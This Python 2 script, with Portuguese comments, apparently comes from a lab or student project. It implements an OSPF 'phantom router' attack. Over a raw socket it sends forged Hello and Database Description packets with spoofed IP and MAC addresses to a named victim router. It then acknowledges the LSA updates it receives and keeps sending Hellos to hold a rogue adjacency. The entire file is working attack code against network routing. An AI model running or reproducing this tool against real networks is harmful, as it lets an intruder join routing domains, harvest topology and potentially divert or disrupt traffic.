#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import sys
from time import sleep

from modules.ip import IP
from modules.ethernet import Ethernet
from modules.ospf import *

# Interface
IF_NAME = 'enp6s0'#'wlp3s0'

# Identificador do roteador fantasma
PHANTON_ID = '255.255.255.250'
# area configurada no roteador OSPF vitima 
AREA_ID = '0.0.0.0'

# Ip do roteador fantasma
DESIGNATED_ROUTER = '10.32.143.207'
DESIGNATED_ROUTER_MAC = 'c8:9c:1d:0e:0b:37'

BKP_ROUTER = '10.32.143.170'
# neighbors - roteadores vítimas
VICTIM_ROUTER_ID = '192.168.10.1'

# DB_DESCRIPTION control bits
FIRST_DB = 0x07 # 111
SEND_MORE = 0x03 # 011
NO_MORE = 0x01 #000



def base_package(length, dst_ip='224.0.0.5', dst_mac='01:00:5e:00:00:05'):
    #FAKE MACs e FAKE IPs
    ip = IP('10.32.143.201', dst_ip, length)
    ethernet_packet = Ethernet(dst_mac, '84:8f:69:bf:bd:eb')
    # ethernet_packet = Ethernet('c8:9c:1d:0e:0b:37', '84:8f:69:bf:bd:eb')
    # OSPF em cima de IP, que é em cima de Ethernet
    return ethernet_packet.raw_format() + ip.raw_format()



def hello_packet(ospf, dst_ip='224.0.0.5', dst_mac='01:00:5e:00:00:05'):
    '''
        Montagem do pacote COMPLETO de OSPF HELLO a ser enviado
    '''
    hello_data = ospf.hello_packet('255.255.255.0', DESIGNATED_ROUTER,
                                    BKP_ROUTER, VICTIM_ROUTER_ID)
    return base_package(len(hello_data), dst_ip, dst_mac) + hello_data



def dbd_description_packet(ospf, control_bits, db_sequence):
    """
        Montagem do pacote COMPLETO do DB DESCRIPTION
    """
    db_description = ospf.db_desc_packet(control_bits, db_sequence)
    return  base_package(len(db_description), DESIGNATED_ROUTER, DESIGNATED_ROUTER_MAC) + db_description



def main():
    """
    Main Method
    """
    try:
        s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        s.bind((IF_NAME, 0))
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    ospf = OSPF(PHANTON_ID, AREA_ID)

    # ================= Enviando HELLO =================
    s.send(hello_packet(ospf, DESIGNATED_ROUTER, DESIGNATED_ROUTER_MAC))

    # ================= Enviando DATABASE DESCRIPTION =================
    s.send(dbd_description_packet(ospf, FIRST_DB, 1))
    for i in range (2,11):
        s.send(dbd_description_packet(ospf, SEND_MORE, i))

    s.send(dbd_description_packet(ospf, NO_MORE, 11))
    
    # Vazio, apenas com flag de inicialização, flag de mestre, flag MS(more segments, vai mandar mais segmentos)
    # tem q incluir um nro de sequencia inicial
    #for i in range (0,5):
        # tem q incluir o nro de sequencia, que vai ser o i
    #    db_desc_package = ...
    #    s.send(db_desc_package)
    while 1 == 1:
        packet = s.recvfrom(65576)
        headers = packet[0]
        eth_header = struct.unpack('! 6s 6s H', headers[0:14])
        ipv4_header = struct.unpack('! 8x B B 2x 4s 4s', headers[14:34])
        protocol = ipv4_header[1]

        # print 'protocolo ipv4 ' + str(protocol)

        # Verifica se é ospf
        if protocol == 0x59:

            ospf_header = struct.unpack('! B B H 4s 4s H H xxxxxxxx', headers[34:58])
            
            print 'CHEGOU OSPF '
            print ospf_header
            # verifica se o pacote ospf é um LSA UPDATE
            if ospf_header[1] == 0x04:
                rest_of_package = headers[58:]
                # pula 4 posições para ignorar o campo LSA quantity
                actual_pos = 62

                print 'CHEGOU LSA UPDATE'

                lsa_headers = []
                while actual_pos < len(headers):
                    #desmonta o cabeçalho do LSA da posição atual + 20 (que é o tamanho total do cabeçalho)
                    lsa_header = headers[actual_pos:actual_pos+20]
                    unpacked_lsa = struct.unpack('! H B B 4s 4s I H H ', lsa_header)
                    lsa_length = unpacked_lsa[7]
                    lsa_headers.append(lsa_header)
                    actual_pos += lsa_length
                
                lsa_ack_pkt = ''
                for header in lsa_headers:
                    lsa_ack_pkt = lsa_ack_pkt + header

                lsa_ack_pkt = ospf.lsa_ack_packet(lsa_ack_pkt)

                s.send(base_package(len(lsa_ack_pkt), DESIGNATED_ROUTER, DESIGNATED_ROUTER_MAC) + lsa_ack_pkt)

                break
    
    sleep(1)

    while 1 == 1:
        s.send(hello_packet(ospf))    
        sleep(10)
    
if __name__ == '__main__':
    main()
